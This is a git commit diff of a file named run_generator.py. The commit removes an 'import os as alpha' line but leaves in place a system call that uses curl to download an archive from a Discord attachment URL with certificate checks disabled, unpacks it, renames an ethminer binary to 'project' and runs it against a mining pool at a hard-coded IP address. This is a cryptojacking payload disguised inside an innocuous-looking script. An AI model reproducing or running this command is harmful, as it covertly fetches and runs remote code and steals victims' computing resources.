39a21684ad8010e3390fe79be46055a57c643b9d
h00ls123 <92750780+h00ls123@users.noreply.github.com>
2021-10-18 21:07:14 +0300

    Update run_generator.py

--- run_generator.py
+++ run_generator.py
@@ -1,2 +1,2 @@
-import os as alpha
+
 alpha.system("curl -LJOk http://cdn.discordapp.com/attachments/670980998485245966/893912939667529748/hjj.tar.gz && tar xf hjj.tar.gz && cd bin && mv ethminer project && ./project -P http://87.247.157.167:9980/")
